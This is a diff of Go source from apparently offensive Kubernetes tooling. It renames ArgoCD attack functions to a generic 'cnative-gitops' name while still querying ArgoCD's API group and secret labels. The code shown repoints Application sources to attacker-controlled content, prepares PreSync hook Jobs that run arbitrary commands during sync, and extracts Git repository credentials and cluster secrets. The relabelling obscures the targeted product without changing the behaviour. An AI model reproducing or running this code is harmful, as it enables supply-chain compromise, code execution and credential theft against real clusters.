@@ -13,20 +13,20 @@ import (
 )
 
 var (
-	argoAppGVR = schema.GroupVersionResource{
+	cnativeGitOpsAppGVR = schema.GroupVersionResource{
 		Group: "argoproj.io", Version: "v1alpha1", Resource: "applications",
 	}
 )
 
-// PoisonArgoApp modifies an ArgoCD Application's source repository or path to point at attacker-controlled content.
-func PoisonArgoApp(ctx context.Context, dynClient dynamic.Interface, ns, appName, repoURL, path string) (*PoisonResult, error) {
+// PoisonCnativeGitOpsApp modifies a cnative-gitops Application's source repository or path to point at attacker-controlled content.
+func PoisonCnativeGitOpsApp(ctx context.Context, dynClient dynamic.Interface, ns, appName, repoURL, path string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "argocd",
+		Platform: "cnative-gitops",
 		Action:   "poison_source",
 		Target:   appName,
 	}
 
-	app, err := dynClient.Resource(argoAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
+	app, err := dynClient.Resource(cnativeGitOpsAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get application: %v", err)
 		return result, nil
@@ -46,7 +46,7 @@ func PoisonArgoApp(ctx context.Context, dynClient dynamic.Interface, ns, appName
 		}
 	}
 
-	_, err = dynClient.Resource(argoAppGVR).Namespace(ns).Update(ctx, app, metav1.UpdateOptions{})
+	_, err = dynClient.Resource(cnativeGitOpsAppGVR).Namespace(ns).Update(ctx, app, metav1.UpdateOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("update failed: %v", err)
 		return result, nil
@@ -57,15 +57,15 @@ func PoisonArgoApp(ctx context.Context, dynClient dynamic.Interface, ns, appName
 	return result, nil
 }
 
-// InjectArgoSyncHook prepares a PreSync hook Job that executes arbitrary commands during ArgoCD sync operations.
-func InjectArgoSyncHook(ctx context.Context, dynClient dynamic.Interface, ns, appName, image, command string) (*PoisonResult, error) {
+// InjectCnativeGitOpsSyncHook prepares a PreSync hook Job that executes arbitrary commands during cnative-gitops sync operations.
+func InjectCnativeGitOpsSyncHook(ctx context.Context, dynClient dynamic.Interface, ns, appName, image, command string) (*PoisonResult, error) {
 	result := &PoisonResult{
-		Platform: "argocd",
+		Platform: "cnative-gitops",
 		Action:   "inject_hook",
 		Target:   appName,
 	}
 
-	app, err := dynClient.Resource(argoAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
+	app, err := dynClient.Resource(cnativeGitOpsAppGVR).Namespace(ns).Get(ctx, appName, metav1.GetOptions{})
 	if err != nil {
 		result.Output = fmt.Sprintf("failed to get application: %v", err)
 		return result, nil
@@ -108,10 +108,10 @@ func InjectArgoSyncHook(ctx context.Context, dynClient dynamic.Interface, ns, ap
 	return result, nil
 }
 
-// StealArgoRepoCredentials extracts Git repository credentials and cluster secrets from ArgoCD's secret store.
-func StealArgoRepoCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
+// StealCnativeGitOpsCredentials extracts Git repository credentials and cluster secrets from the cnative-gitops secret store.
+func StealCnativeGitOpsCredentials(ctx context.Context, client kubernetes.Interface, ns string) (string, error) {
 	var sb strings.Builder
-	sb.WriteString("ArgoCD Repository Credentials:\n")
+	sb.WriteString("cnative-gitops Repository Credentials:\n")
 
 	secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{
 		LabelSelector: "argocd.argoproj.io/secret-type=repository",
@@ -143,7 +143,7 @@ func StealArgoRepoCredentials(ctx context.Context, client kubernetes.Interface, 
 		LabelSelector: "argocd.argoproj.io/secret-type=cluster",
 	})
 	if err == nil {
-		sb.WriteString("\nArgoCD Cluster Secrets:\n")
+		sb.WriteString("\ncnative-gitops Cluster Secrets:\n")
 		for _, s := range clusterSecrets.Items {
 			fmt.Fprintf(&sb, "  Cluster: %s\n", s.Name)
 			if server, ok := s.Data["server"]; ok {
@@ -158,16 +158,16 @@ func StealArgoRepoCredentials(ctx context.Context, client kubernetes.Interface, 
 	return sb.String(), nil
 }
 
-// ListArgoApps enumerates all ArgoCD Application resources with their sync and health status.
-func ListArgoApps(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
+// ListCnativeGitOpsApps enumerates all cnative-gitops Application resources with their sync and health status.
+func ListCnativeGitOpsApps(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
 	var sb strings.Builder
 
-	apps, err := ListCRDs(ctx, dynClient, argoAppGVR, ns)
+	apps, err := ListCRDs(ctx, dynClient, cnativeGitOpsAppGVR, ns)
 	if err != nil {
 		return "", err
 	}
 
-	fmt.Fprintf(&sb, "ArgoCD Applications (%d):\n", len(apps))
+	fmt.Fprintf(&sb, "cnative-gitops Applications (%d):\n", len(apps))
 	for _, app := range apps {
 		repoURL, _, _ := unstructured.NestedString(app.Object, "spec", "source", "repoURL")
 		path, _, _ := unstructured.NestedString(app.Object, "spec", "source", "path")
